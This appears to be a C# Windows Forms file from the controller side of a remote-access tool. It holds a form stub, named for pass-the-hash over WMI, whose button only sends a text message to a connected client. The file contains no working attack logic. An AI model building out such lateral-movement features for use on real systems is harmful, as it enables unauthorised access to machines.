using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmPTH : Form
    {
        private Client c;
        public FrmPTH(Client client, string technique)
        {
            c = client;
            InitializeComponent();
        }

        private void btnExecutePTHWmi_Click(object sender, EventArgs e)
        {
            new Core.Packets.ServerPackets.GetMessage(txtMessage.Text, "Server").Execute(c);
        }
    }
}
